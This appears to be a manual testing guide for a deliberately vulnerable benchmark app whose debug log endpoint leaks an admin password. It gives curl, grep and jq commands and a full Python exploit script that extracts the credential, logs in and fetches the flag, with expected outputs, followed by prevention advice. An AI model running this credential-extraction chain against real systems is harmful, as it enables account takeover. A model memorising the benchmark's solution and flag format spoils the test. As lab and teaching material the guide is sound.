# S7BEN-EASY-007: Manual Testing Guide

## Vulnerability: Sensitive Data in Logs - Credential Exposure

### Overview
This benchmark demonstrates a critical logging vulnerability where sensitive data (passwords, session tokens, API keys) is logged in debug logs, allowing attackers to extract credentials and compromise accounts.

**Key Difference from Phase 1:** This benchmark requires parsing verbose logs mixed with noise, extracting credentials, AND successfully using them to authenticate - proving the full attack chain.

---

## Setup

### 1. Build and Start the Benchmark
```bash
cd benchmarks/S7BEN-EASY-007
make build
make up
```

### 2. Verify Service is Running
```bash
make test
# Should output: Health check passed
```

### 3. Access the Application
Open your browser to: http://localhost:5000

---

## Understanding the Vulnerability

### What Data is Logged?

The application logs everything at DEBUG level:
- ✅ **Request bodies** - Including passwords!
- ✅ **Session tokens** - Full session data
- ✅ **API keys** - During initialization
- ✅ **Query results** - With PII
- ✅ **Configuration** - Credentials

### Log Entry Example:

```
[2026-01-08 12:00:01] INFO: Application starting...
[2026-01-08 12:00:01] DEBUG: Database host: db.internal.strike7.local
[2026-01-08 12:00:02] INFO: Creating administrative users...
[2026-01-08 12:00:02] DEBUG: User created: username=super_admin, role=super_admin, password=Xy9_mK3pQr4sT8vW2nZ1  <-- VULNERABILITY!
[2026-01-08 12:00:03] INFO: Administrative users created successfully
...hundreds more lines...
```

---

## Manual Testing Steps

### Step 1: Access Debug Logs

```bash
# View first page of logs
curl -s "http://localhost:5000/debug/logs" | python3 -m json.tool
```

**Expected Output:**
```json
{
  "status": "success",
  "logs": [ ... array of log lines ... ],
  "page": 1,
  "total_pages": 5,
  "total_lines": 450
}
```

### Step 2: Search for Credentials

```bash
# Method 1: Search for "password" in logs
curl -s "http://localhost:5000/debug/logs?search=password" | python3 -m json.tool

# Method 2: Filter DEBUG level logs
curl -s "http://localhost:5000/debug/logs?filter=DEBUG" | python3 -m json.tool

# Method 3: Search for super_admin
curl -s "http://localhost:5000/debug/logs?search=super_admin" | python3 -m json.tool
```

### Step 3: Extract Password

```bash
# Download all logs
curl -s "http://localhost:5000/debug/logs/download" > logs.json

# Extract password using grep/awk
cat logs.json | grep -o 'password=[^"]*' | grep super_admin | cut -d'=' -f2
```

**Expected to find:**
```
password=<random_password_here>
```

### Step 4: Login with Extracted Credentials

```bash
# Use extracted password
PASSWORD="extracted_password_here"

curl -c cookies.txt -X POST "http://localhost:5000/login" \
  -d "username=super_admin&password=$PASSWORD" \
  -L
```

### Step 5: Get the Flag

```bash
curl -b cookies.txt "http://localhost:5000/admin/secret"
```

**Expected Output:**
```json
{
  "status": "success",
  "message": "Super admin access granted",
  "username": "super_admin",
  "flag": "S7BEN{log_credential_leak_<dynamic_hash>}",
  "proof": "Authenticated with credentials extracted from logs"
}
```

---

## Exploitation Methods

### Method 1: Python Automated Exploit

Create `exploit.py`:

```python
import requests
import re
import json

URL = "http://localhost:5000"

def extract_password_from_logs():
    """Parse logs to find super_admin password"""
    print("[*] Downloading application logs...")

    response = requests.get(f"{URL}/debug/logs/download")
    data = response.json()

    if data['status'] != 'success':
        print("[-] Failed to download logs")
        return None

    logs = data['content']
    print(f"[+] Downloaded {data['size_bytes']} bytes of logs")

    # Search for super_admin password
    print("[*] Searching for super_admin credentials...")

    # Pattern: username=super_admin, role=super_admin, password=XXX
    pattern = r'username=super_admin.*?password=([A-Za-z0-9_-]+)'
    match = re.search(pattern, logs)

    if match:
        password = match.group(1)
        print(f"[+] Found password: {password}")
        return password

    print("[-] Password not found in logs")
    return None

def login_and_get_flag(password):
    """Login with extracted password and get flag"""
    print(f"\n[*] Attempting login as super_admin...")

    session = requests.Session()
    login_response = session.post(
        f"{URL}/login",
        data={
            "username": "super_admin",
            "password": password
        }
    )

    if 'dashboard' in login_response.url:
        print("[+] Login successful!")
    else:
        print("[-] Login failed")
        return False

    # Get flag
    print("[*] Accessing admin secret endpoint...")

    flag_response = session.get(f"{URL}/admin/secret")
    flag_data = flag_response.json()

    if flag_data['status'] == 'success':
        print("\n" + "="*60)
        print("✅ EXPLOITATION SUCCESSFUL!")
        print("="*60)
        print(f"\nFlag: {flag_data['flag']}")
        print(f"\nProof: {flag_data['proof']}")
        print(f"Timestamp: {flag_data['timestamp']}")
        print("\n" + "="*60)
        return True

    return False

def main():
    print("="*60)
    print("S7BEN-EASY-007: Sensitive Data in Logs Exploit")
    print("="*60)

    # Step 1: Extract password
    password = extract_password_from_logs()

    if not password:
        print("\n[-] Exploitation failed - couldn't find password")
        return False

    # Step 2: Login and get flag
    success = login_and_get_flag(password)

    return success

if __name__ == "__main__":
    success = main()
    exit(0 if success else 1)
```

Run the exploit:
```bash
python3 exploit.py
```

**Expected Output:**
```
============================================================
S7BEN-EASY-007: Sensitive Data in Logs Exploit
============================================================
[*] Downloading application logs...
[+] Downloaded 15234 bytes of logs
[*] Searching for super_admin credentials...
[+] Found password: Xy9_mK3pQr4sT8vW2nZ1

[*] Attempting login as super_admin...
[+] Login successful!
[*] Accessing admin secret endpoint...

============================================================
✅ EXPLOITATION SUCCESSFUL!
============================================================

Flag: S7BEN{log_credential_leak_a1b2c3d4e5f67890abcdef1234567890}

Proof: Authenticated with credentials extracted from logs
Timestamp: 2026-01-08T12:34:56.789012

============================================================
```

### Method 2: Browser-Based Exploitation

1. **Access Logs:**
   - Open http://localhost:5000/debug/logs
   - Browser will show JSON response

2. **Search for Password:**
   - Press Ctrl+F
   - Search for "super_admin"
   - Look for line with `password=XXX`

3. **Login:**
   - Go to http://localhost:5000/login
   - Username: `super_admin`
   - Password: `<extracted_from_logs>`

4. **Get Flag:**
   - Click "Get Flag" button on dashboard
   - Or visit http://localhost:5000/admin/secret

### Method 3: Command Line with jq

```bash
# Extract password using jq
PASSWORD=$(curl -s "http://localhost:5000/debug/logs/download" | \
  jq -r '.content' | \
  grep -o 'username=super_admin.*password=[^ ]*' | \
  grep -o 'password=[^ ]*' | \
  cut -d'=' -f2 | \
  tr -d ',')

echo "Extracted password: $PASSWORD"

# Login
curl -c cookies.txt -X POST "http://localhost:5000/login" \
  -d "username=super_admin&password=$PASSWORD" \
  -L > /dev/null

# Get flag
curl -b cookies.txt "http://localhost:5000/admin/secret" | python3 -m json.tool
```

---

## Understanding the Dynamic Flag

The flag is generated based on successful authentication:

```python
def generate_flag(username, timestamp):
    data = f"log_credential_theft:{username}:{timestamp}"
    hash = hmac.new(SECRET, data.encode(), sha256).hexdigest()[:32]
    return f"S7BEN{{log_credential_leak_{hash}}}"
```

This proves:
- **Credentials were extracted** (from logs)
- **Successfully authenticated** (as super_admin)
- **Timing recorded** (when exploitation occurred)

---

## Troubleshooting

### Issue: Can't find password in logs

**Cause:** Logs may have been cleared or not generated.

**Solution:**
```bash
# Reset application to regenerate logs
curl -X POST http://localhost:5000/reset

# Wait a moment for initialization
sleep 2

# Try again
curl -s "http://localhost:5000/debug/logs?search=super_admin"
```

### Issue: Login fails with extracted password

**Cause:** Password may have special characters or whitespace.

**Solution:** Ensure you're extracting the exact password without trailing commas or spaces.

### Issue: Access denied to /admin/secret

**Cause:** Not logged in as super_admin.

**Solution:** Verify you're using the correct credentials and session.

---

## Prevention Techniques

### Proper Logging Practices:

```python
# BAD - Logs sensitive data
logging.debug(f"Login request: {request.json}")

# GOOD - Sanitize before logging
login_data = {k: v if k != 'password' else '***REDACTED***'
              for k, v in request.json.items()}
logging.debug(f"Login request: {login_data}")
```

### Best Practices:

1. **Never log passwords** - Redact before logging
2. **Never log full request/response** bodies
3. **Don't log session tokens** or API keys
4. **Use structured logging** - Makes sanitization easier
5. **Restrict log access** - Not publicly accessible
6. **Implement log scrubbing** - Automated PII removal
7. **Regular log audits** - Check for sensitive data
8. **Separate sensitive logs** - Different access controls

---

## Real-World Examples

This vulnerability has occurred in:
- **GitHub (2020):** Passwords logged in plaintext
- **Twitter (2018):** Passwords logged in internal logs
- **Facebook (2019):** Millions of Instagram passwords logged
- **Google (2020):** G Suite admin passwords logged

---

## Cleanup

```bash
make down
make clean
```

---

## Success Criteria

- ✅ Accessed debug logs at /debug/logs
- ✅ Parsed logs to find super_admin password
- ✅ Extracted credentials from DEBUG level logs
- ✅ Successfully logged in as super_admin
- ✅ Retrieved dynamically generated flag
- ✅ Flag format: `S7BEN{log_credential_leak_<32_hex_chars>}`

---

## Additional Resources

- **CWE-532:** https://cwe.mitre.org/data/definitions/532.html
- **OWASP Logging Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
- **NIST Logging Guide:** https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-92.pdf
